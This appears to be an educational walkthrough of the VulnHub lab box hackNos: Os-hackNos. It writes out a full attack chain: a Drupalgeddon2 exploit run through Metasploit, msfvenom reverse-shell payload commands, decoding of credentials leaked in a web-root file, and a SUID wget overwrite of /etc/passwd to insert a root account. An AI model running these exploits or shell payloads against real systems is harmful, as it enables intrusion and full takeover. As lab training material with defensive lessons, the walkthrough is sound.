# hackNos: Os-hackNos (VulnHub) — A Beginner-Friendly Walkthrough

| Field | Value |
|---|---|
| **Machine** | hackNos: Os-hackNos (a.k.a. Os-hackNos-1) |
| **Difficulty** | Easy |
| **Author** | Rahul Gehlaut (hackNos) |
| **Released** | 27 November 2019 |
| **VulnHub Entry** | https://vulnhub.com/entry/hacknos-os-hacknos,401/ |
| **Download** | https://vulnhub.com/entry/hacknos-os-hacknos,401/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu, Apache 2.4 + Drupal 7.57 + PHP) |

> **Note on the network:** every command below assumes the Kali attacker is
> `192.168.56.10` and the hackNos VM is `192.168.56.101`. Substitute your own IPs
> if your host-only network uses a different range. The box ships as `.ova`
> (and a `.vmdk`); import it and put both VMs on the same host-only network.

> **Goal:** capture two flags — the **user** flag (`/home/james/user.txt`) and the
> **root** flag (`/root/root.txt`).

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this walkthrough you will have practised, on a real (but safe,
offline) target:

1. **Host discovery** and **port scanning** — finding the target and its services.
2. **Web directory enumeration** — using `dirb`/`gobuster` to find the CMS.
3. **CMS version fingerprinting** — reading `CHANGELOG.txt` to learn Drupal's
   exact version.
4. **Mapping a version to a CVE** — **Drupalgeddon2 (CVE-2018-7600)**.
5. **Remote code execution (RCE)** — exploiting the CMS to get a `www-data` shell.
6. **Decoding layered encodings** — Base64 → Brainfuck to recover a password.
7. **Finding SUID binaries** and understanding why they are dangerous.
8. **Abusing a SUID `wget`** to overwrite a system file and add a root user.
9. **Privilege escalation** to full **root**.

> **The intended chain in one breath:** nmap finds SSH (22) and HTTP (80) → `dirb`
> reveals `/drupal/` → `CHANGELOG.txt` says Drupal **7.57** → **CVE-2018-7600
> (Drupalgeddon2)** gives a `www-data` shell → a file on the web root,
> `alexander.txt`, is Base64 that decodes to Brainfuck and then to
> **`james:Hacker@4514`** → a **SUID `/usr/bin/wget`** lets us overwrite
> `/etc/passwd` and insert a root-level user → `su` → root.

---

## 1. Reconnaissance — finding the target

### 1.1 Identify your own IP

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists every interface and its address. Our attacker is
> `192.168.56.10/24`, so the whole subnet is `192.168.56.0–255`.

### 1.2 Sweep the subnet for the target


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 3 Captured ARP Req/Rep packets, from 3 hosts.
   IP            At MAC Address     Count  Len  MAC Vendor
 192.168.56.1    08:00:27:xx:xx:xx   1    60  PCS Systemtechnik GmbH
 192.168.56.10   08:00:27:aa:aa:aa   1    60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:bb:bb:bb   1    60  PCS Systemtechnik GmbH   <-- target
```

`arp-scan` works too:

```bash
sudo arp-scan --interface=eth0 --localnet
```

> **Why it works:** both tools ARP-sweep the local subnet ("who has this IP?")
> and list everyone who answers. Lab VMs live on your local network, so this is
> the fastest way to find them.

**Target confirmed: `192.168.56.101`.**

![Finding the target IP](images/01-netdiscover.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Scan for open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sC -sV -p- -oN hacknos1.nmap 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:**
> - `-p-` scans **all** 65535 ports, not just the top 1000.
> - `-sV` fingerprints the version behind each open port.
> - `-sC` runs Nmap's default scripts.
>
> Only **SSH (22)** and **HTTP (80)** are open. We have no SSH credentials, so the
> web server is the way in.

*(Version strings vary slightly by build — trust your own scan.)*

### 2.2 Look at the web server

Browsing `http://192.168.56.101/` shows the default Apache page — nothing useful.
On a CTF, an empty-looking landing page means **something is in a directory we
haven't guessed**, so we enumerate.

### 2.3 Directory busting


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
dirb http://192.168.56.101/
```

```text
+ http://192.168.56.101/index.html     (CODE:200|SIZE:10918)
+ http://192.168.56.101/server-status  (CODE:403|SIZE:301)
+ http://192.168.56.101/drupal/        (CODE:301|SIZE:314)
```

Or with `gobuster`:

```bash
gobuster dir -u http://192.168.56.101 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

> **Why it works:** `dirb`/`gobuster` request `http://target/<word>` for every
> wordlist entry and report the ones that don't return `404`. The standout hit is
> **`/drupal/`** — a content management system. Whenever you find a CMS, the next
> question is *which version*.

### 2.4 Fingerprint the CMS version

```bash
curl -s http://192.168.56.101/drupal/robots.txt | grep -i disallow
curl -s http://192.168.56.101/drupal/CHANGELOG.txt | head
```

```text
Drupal 7.57, 2018-02-21
----------------------
- Fixed security issues (multiple vulnerabilities). See SA-CORE-2018-001.
```

> **Why it works:** Drupal publishes a `CHANGELOG.txt` that lists the exact
> version. Version **7.57** is old and — crucially — predates the fix for the
> most famous Drupal bug, **Drupalgeddon2**.

![Drupal CHANGELOG showing version 7.57](images/02-changelog.png)

---

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability: CVE-2018-7600 ("Drupalgeddon2")

Drupal's Form API accepts "render arrays" where keys starting with `#` can name
callables (functions). Drupal failed to sanitise some of these keys, so an
anonymous visitor could reach an AJAX endpoint and trick Drupal into calling an
arbitrary PHP function (like `system` or `passthru`) with attacker-supplied
arguments.

> **Why it works:** Drupal's default "new user registration" and "request new
> password" forms are reachable **without logging in**. By posting a crafted
> render array, we smuggle a PHP function call into a parameter the site trusts.
> No credentials are needed, so this is a pre-authentication RCE. It affects
> Drupal 7.x before 7.58 and 8.x before several later versions — and our target
> runs **7.57**.

### 3.2 Confirm and exploit with Metasploit

Kali has a module:


> ### 📖 Concept — What Metasploit is doing for you
>
> **Metasploit** is a framework of pre-written exploits, payloads and auxiliary
> modules. It automates the *mechanics* — building the request, catching the
> connection, giving you a session — but it does not replace understanding the
> vulnerability.
>
> ```bash
> sudo msfdb init            # first run only — initialises the Postgres database
> msfconsole -q              # -q: skip the banner
> ```
>
> ```text
> msf6 > search <term>              # find modules
> msf6 > use exploit/unix/webapp/…
> msf6 > info                       # READ THIS — describes options and caveats
> msf6 > show options               # what must be set?
> msf6 > set RHOSTS 192.168.56.101  # the TARGET
> msf6 > set LHOST 192.168.56.10    # YOUR ip, on the LAB interface
> msf6 > set TARGETURI /wordpress   # subdirectory the app lives in
> msf6 > show payloads              # what can I pair with this?
> msf6 > exploit
> ```
>
> > **`LHOST` and `TARGETURI` are the two options people get wrong most often.**
> > `LHOST` must be your IP **on the lab interface** — not `127.0.0.1`, not your NAT
> > address. Check with `ip -br a`. `TARGETURI` must include any subdirectory the app
> > lives in (`/wordpress`, `/joomla`, `/webdav`); get it wrong and you get
> > unexplained 404s.
>
> **Sessions:** `sessions -l` list · `sessions -i 1` interact · `sessions -u 1`
> upgrade a dumb shell to Meterpreter · `meterpreter > shell` drop back to a plain
> system shell. Useful Meterpreter commands: `sysinfo`, `getuid`, `ps`, `download`,
> `upload`, `hashdump`.
>
> **`msfvenom`** generates standalone payloads:
>
> ```bash
> msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=… -f elf > shell.elf
> ```
>
> > **Prefer doing it manually at least once per technique.** A Metasploit module
> > hides the actual HTTP request or memory layout from you. Build the exploit by hand
> > first, then use the module to check your understanding — not instead of it.
>
> **Deep dive:** [CONCEPTS §11.3 — Metasploit](../../docs/CONCEPTS.md#113-metasploit)

```bash
msfconsole -q
```

```text
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 > set RHOSTS 192.168.56.101
msf6 > set TARGETURI /drupal
msf6 > set LHOST 192.168.56.10
msf6 > set LPORT 4444
msf6 > run
```

```text
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] Drupal 7 targeted ...
[*] Sending stage ...
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: www-data
```

> **Why it works:** the module auto-detects the version, builds the malicious
> render-array request, and catches our callback. We now have code execution as
> the web user, **`www-data`**.

*(File-less alternative: the Ruby PoC `drupalgeddon2.rb` from
`github.com/dreadlocked/Drupalgeddon2` — `ruby drupalgeddon2.rb
http://192.168.56.101/drupal`. If it errors with `cannot load such file --
highline/import`, run `gem install highline` first.)*

Get a proper TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Why it works:** a raw web/Meterpreter shell is clumsy; a pseudo-terminal makes
> interactive tools behave.

### 3.3 Enumerate users and hunt for credentials

```bash
cat /etc/passwd | grep -v nologin
ls -la /home
```

```text
james:x:1000:1000:james,,,:/home/james:/bin/bash
```

> **Why it works:** the user list reveals a real account, **`james`**. We need a
> password for it — and CTF authors love hiding credentials in the web root.

Look at the web application directory:

```bash
ls -la /var/www/html/
cat /var/www/html/alexander.txt
```

```text
PF0gLS0gLS4rLi0gLS0tLisKKysuLi0uKysrLi4uKy4tLi0tLi0uKy4rKysr

```

> **Why it works:** a lone text file in the web root is a deliberate clue. The
> string is **Base64** — it ends in no padding here, but decodes cleanly. Attackers
> (and CTF authors) layer trivial encodings; you just peel them one at a time.

### 3.4 Decode the layered secret (Base64 → Brainfuck)

First decode the Base64:


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
echo 'PF0gLS0gLS4rLi0gLS0tLisKKysuLi0uKysrLi4uKy4tLi0tLi0uKy4rKysr' | base64 -d
```

```text
<] -- -.+.- ---.+
++..-.+++...+.-.--.-.+.++++
```

The result is **Brainfuck** — an esoteric language made only of the characters
`<>+-.,[]`. Run it through any Brainfuck interpreter (there are many online, or
`apt install bf`):

```text
james:Hacker@4514
```

> **Why it works:** Base64 is an *encoding*, not encryption — `base64 -d` reverses
> it instantly. The output is a Brainfuck program, and Brainfuck interpreters are
> trivial. The decoded text hands us a **username and password**:
> **`james:Hacker@4514`**.

![Decoding alexander.txt to james:Hacker@4514](images/03-decode.png)

### 3.5 Read the user flag

We can't `su` cleanly in a web shell (no TTY prompt), but we can read `james`'
home directory directly as `www-data` on this build:

```bash
cat /home/james/user.txt
```

```text
Try Harder ...
MD5-HASH : 3a7d1e0a...
```

> **Why it works:** the user flag lives in `james`' home directory. The MD5 hash
> shown is a decoy/hint; the real credentials came from `alexander.txt`.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Find SUID binaries

A **SUID** binary runs with the privileges of its **owner**, not the user who
launches it. If root owns a SUID program, running it can grant root-equivalent
power. Search for them:


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/wget        <-- unusual!
/usr/bin/find
...
```

> **Why it works:** `find / -perm -u=s -type f` lists every SUID file. Almost all
> of them are normal (`passwd`, `sudo`, `su`, `ping`). The odd one out here is
> **`/usr/bin/wget`** — `wget` has no business being SUID, and it is owned by
> root. That is our path up.

> **Reminder from the box author:** do **not** use the SUID `find` to escalate —
> the intended path is `wget`. Using `find -exec` works too, but the author asks
> you to solve it the intended way, and `wget` is the more interesting lesson:
> a download tool that runs as root can **overwrite any file on the system**.

### 4.2 Create our own root-level account

Because the SUID `wget` runs as **root**, `wget -O /etc/passwd ...` will
overwrite the password file as root. First, on Kali, generate a password hash for
a user we control:


> ### 📖 Concept — The `/etc/passwd` overwrite trick
>
> Historically Linux stored password hashes in `/etc/passwd` field 2. Today they live
> in `/etc/shadow` (root-only) and field 2 of `/etc/passwd` holds a literal `x`
> placeholder. **But the login code still honours a real hash in field 2 if one is
> there.** So if you can *write* `/etc/passwd` — via a SUID `cp`/`wget`, a writable
> file, an NFS export, or a MySQL `dumpfile` — you can append:
>
> ```text
> ignite:<hash-of-a-password-I-chose>:0:0:root:/root:/bin/bash
> ```
>
> and `su ignite` gives you a **root** shell.
>
> **The seven colon-separated fields:**
>
> | # | Field | Value | Why |
> | --- | --- | --- | --- |
> | 1 | username | `ignite` | What you `su` to |
> | 2 | password | `$1$ignite$3eTbJm98O9Hz…` | A **real hash**, not `x` — so `su` authenticates against `/etc/passwd` directly, with no `/etc/shadow` entry needed |
> | 3 | **UID** | **`0`** | **UID 0 *is* root.** This single number is the entire trick — the username is irrelevant. |
> | 4 | GID | `0` | The `root` group |
> | 5 | GECOS | `root` | Comment field, ignored |
> | 6 | home | `/root` | |
> | 7 | shell | `/bin/bash` | Must be a real shell or login fails |
>
> Generate the hash yourself:
>
> ```bash
> openssl passwd -1 -salt ignite pass123      # -1 = MD5-crypt, $1$
> openssl passwd -6 -salt ignite pass123      # -6 = SHA-512-crypt, $6$
> ```
>
> > ⚠️ **Always regenerate this hash. Never copy one from a writeup — including this
> > one.** MD5-crypt output is exactly **22 characters** after the final `$`. Values
> > transcribed into blog posts are frequently mistyped, and a 21-character hash
> > fails silently with `Authentication failure`, sending you debugging in entirely
> > the wrong direction. Verify with
> > `python3 -c "import crypt; print(crypt.crypt('pass123','$1$ignite'))"`.
>
> **Deep dive:** [CONCEPTS §15.6 — Writable files and directories](../../docs/CONCEPTS.md#156-writable-files-and-directories)

```bash
openssl passwd -1 -salt salt hacked
```

```text
$1$salt$DdAoiqtA/a/oeQbF.cvVY1
```

> **Why it works:** `openssl passwd -1` produces an **MD5-crypt** hash in the same
> format `/etc/passwd` (or `/etc/shadow`) understands. `-salt salt` fixes the
> salt so the output is predictable. We'll insert this hash for a new account.

### 4.3 Prepare the modified passwd file

On the target, copy the real `passwd` file and append our entry (the trailing
slash in `:/root/` keeps the format valid):

```bash
cp /etc/passwd /tmp/passwd
echo 'hacked:$1$salt$DdAoiqtA/a/oeQbF.cvVY1:0:0::/root/:/bin/bash' >> /tmp/passwd
tail -1 /tmp/passwd
```

```text
hacked:$1$salt$DdAoiqtA/a/oeQbF.cvVY1:0:0::/root/:/bin/bash
```

> **What the fields mean:** `hacked` is the username; the long string is the
> password hash; **`0:0`** is UID and **GID** — **UID 0 is root**; the home is
> `/root`; the shell is `/bin/bash`. A UID-0 account *is* a root account.

### 4.4 Use the SUID wget to overwrite /etc/passwd

Typically you serve the file over HTTP and let the SUID `wget` fetch it as root:

```bash
# On Kali (in the folder containing your modified passwd):
python3 -m http.server 8000
```

```bash
# On the target — the SUID bit makes this run as root:
wget http://192.168.56.10:8000/passwd -O /etc/passwd
```

> **Why it works:** `-O /etc/passwd` tells `wget` to write the downloaded file
> **over** `/etc/passwd`. Normally only root can write there — but this `wget` is
> **SUID root**, so the write succeeds. Our UID-0 user is now in the password
> file.

> **Alternative route (also valid):** read `/etc/shadow`, copy root's hashed
> password line onto the `james` line in a local copy, then overwrite
> `/etc/shadow` the same way (`wget ... -O /etc/shadow`). Then `su james` with
> root's password gives a root shell.

### 4.5 Switch to the new root user

```bash
su hacked
# password: hacked
```

```text
root@hackNos:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

Read the final flag:

```bash
cat /root/root.txt
```

```text
#############################################################
#  Congratulations! You have rooted the box.
#  MD5-HASH : <root flag hash here>
#  Author : Rahul Gehlaut
#############################################################
```

> **Why it works:** our `hacked` account has UID 0, so `su hacked` drops us
> straight into a root shell. Game over.

> **If `su` complains "must be run from a terminal":** the PHP/Meterpreter shell
> has no TTY. Upgrade it (`python3 -c 'import pty; pty.spawn("/bin/bash")'`), or
> use the `drupal_drupalgeddon2` Meterpreter module and its `shell` command,
> which provides an interactive TTY.

![Root shell and root flag](images/04-root-shell.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Location | Impact | Fix |
|---|---|---|---|---|
| 1 | **Drupalgeddon2 RCE (CVE-2018-7600)** | Drupal 7.57 core `/drupal/` | Unauthenticated remote code execution | Upgrade Drupal to 7.58+ / 8.5.1+ |
| 2 | **Outdated CMS version** | Drupal 7.57 | Known public exploits available | Keep CMS patched; subscribe to advisories |
| 3 | **Sensitive files in the web root** | `/var/www/html/alexander.txt` | Leaks a username/password via encoded text | Never store credentials in the web root |
| 4 | **Weak, layered obfuscation treated as security** | Base64 → Brainfuck file | Password recovered in seconds | Don't rely on encoding to protect secrets |
| 5 | **Unnecessary SUID binary** | `/usr/bin/wget` (SUID root) | Arbitrary file write as root → full takeover | Remove SUID from programs that don't need it |
| 6 | **World-writable path to sensitive files** | `wget -O /etc/passwd` | Inject a UID-0 account | Scope SUID; monitor writes to `/etc` |
| 7 | **Weak password choice** | `james:Hacker@4514`, `hacked:hacked` | Easily guessed/cracked | Strong, unique passwords; MFA |

---

## 6. Defensive lessons (blue team)

- **Patch CMS software promptly.** Drupalgeddon2 had a fix within hours of
  disclosure, yet unpatched installs are still compromised today. Subscribe to
  your CMS's security list and patch fast.
- **Never place secrets in the web root.** `alexander.txt` was reachable by
  anyone. Credentials belong in a secrets manager, not a text file a web server
  will happily serve.
- **Encoding is not encryption.** Base64 and Brainfuck only slow a reader down by
  seconds. Never treat obfuscated text as protection.
